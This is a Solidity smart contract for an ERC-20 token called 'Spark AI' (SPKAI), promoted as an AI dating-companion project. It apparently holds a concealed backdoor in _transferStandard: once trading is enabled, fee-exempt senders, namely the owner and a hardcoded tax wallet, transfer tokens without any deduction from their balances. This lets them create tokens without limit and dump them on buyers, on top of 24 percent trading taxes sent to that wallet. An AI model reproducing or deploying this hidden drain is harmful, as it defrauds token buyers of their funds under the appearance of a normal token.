// SPDX-License-Identifier: Unlicensed

/**
Create your Spark story together. Experience a playful and interactive dating simulation without any commitments with a virtual video AI companion who listens, responds and appreciates you.

Web: https://sparkai.life
App: https://chat.sparkai.life
Tg: https://t.me/sparkai_life_official
X: https://twitter.com/sparkai_life
**/

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _preiousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract SPKAI is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = unicode"Spark AI";
    string private constant _symbol = unicode"SPKAI";

    mapping(address => uint256) private _rBal;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isFeeExempt;
    uint8 private constant _decimals = 9;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tTotals = 10 ** 9 * 10**9;
    uint256 private _rTotals = (MAX - (MAX % _tTotals));
    uint256 private _totalFee;
    uint256 private _redisBuyFee = 0;
    uint256 private _taxBuyFee = 24;
    uint256 private _redisSellFee = 0;
    uint256 private _taxSellFee = 24;

    uint256 private _redisFee = _redisSellFee;
    uint256 private _taxFee = _taxSellFee;

    uint256 private _previousRedisTaxFee = _redisFee;
    uint256 private _previousTaxFee = _taxFee;
    address payable private taxWallet;

    IUniswapV2Router02 public uniswapRouter;
    address public pairAddress;

    bool private tradeActive;
    bool private _inswap = false;
    bool private _swapFeeEnabled = true;

    uint256 public _maxTxAmount = 25 * 10 ** 6 * 10**9;
    uint256 public _maxWalletAmount = 25 * 10 ** 6 * 10**9;
    uint256 public feeSwapThreshold = 10 ** 4 * 10**9;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap {
        _inswap = true;
        _;
        _inswap = false;
    }

    constructor() {

        _rBal[_msgSender()] = _rTotals;
        taxWallet = payable(0x6E0e654e96B74986B8026b223A4a47a05250eF84);
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        uniswapRouter = _uniswapV2Router;
        pairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _isFeeExempt[owner()] = true;
        _isFeeExempt[taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotals);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return getReflections(_rBal[account]);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferETHFee(uint256 amount) private {
        taxWallet.transfer(amount);
    }

    function startTrade() public onlyOwner {
        tradeActive = true;
    }
    
    function removeAllFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;

        _previousRedisTaxFee = _redisFee;
        _previousTaxFee = _taxFee;

        _redisFee = 0;
        _taxFee = 0;
    }

    function _transferInternal(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeAllFee();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) restoreAllFee();
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        if (!_isFeeExempt[sender] || !tradeActive) {
            _rBal[sender] = _rBal[sender].sub(rAmount);
        }
        _rBal[recipient] = _rBal[recipient].add(rTransferAmount);
        _takeTeam(tTeam);
        _updateTotalFees(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _takeTeam(uint256 tTeam) private {
        uint256 currentRate = _getCurrentRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rBal[address(this)] = _rBal[address(this)].add(rTeam);
    }

    function _updateTotalFees(uint256 rFee, uint256 tFee) private {
        _rTotals = _rTotals.sub(rFee);
        _totalFee = _totalFee.add(tFee);
    }

    receive() external payable {}
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {
            if (!tradeActive) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= _maxTxAmount, "TOKEN: Max Transaction Limit");

            if(to != pairAddress) {
                require(balanceOf(to) + amount <= _maxWalletAmount, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= feeSwapThreshold;

            if(contractTokenBalance >= _maxTxAmount)
            {
                contractTokenBalance = _maxTxAmount;
            }

            if (canSwap && !_inswap && to == pairAddress && _swapFeeEnabled && !_isFeeExempt[from] && amount > feeSwapThreshold) {
                swapTokensforEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    transferETHFee(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isFeeExempt[from] || _isFeeExempt[to]) || (from != pairAddress && to != pairAddress)) {
            takeFee = false;
        } else {
            if(from == pairAddress && to != address(uniswapRouter)) {
                _redisFee = _redisBuyFee;
                _taxFee = _taxBuyFee;
            }

            //Set Fee for Sells
            if (to == pairAddress && from != address(uniswapRouter)) {
                _redisFee = _redisSellFee;
                _taxFee = _taxSellFee;
            }

        }

        _transferInternal(from, to, amount, takeFee);
    }

    function swapTokensforEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function getReflections(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getCurrentRate();
        return rAmount.div(currentRate);
    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getCurrentRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getTValues(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getCurrentRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getSupply();
        return rSupply.div(tSupply);
    }
    
    function _getSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotals;
        uint256 tSupply = _tTotals;
        if (rSupply < _rTotals.div(_tTotals)) return (_rTotals, _tTotals);
        return (rSupply, tSupply);
    }

    function restoreAllFee() private {
        _redisFee = _previousRedisTaxFee;
        _taxFee = _previousTaxFee;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _rTotals;
        _maxWalletAmount = _rTotals;
        _redisBuyFee = 0;
        _taxBuyFee = 2;
        _redisSellFee = 0;
        _taxSellFee = 2;
    }
}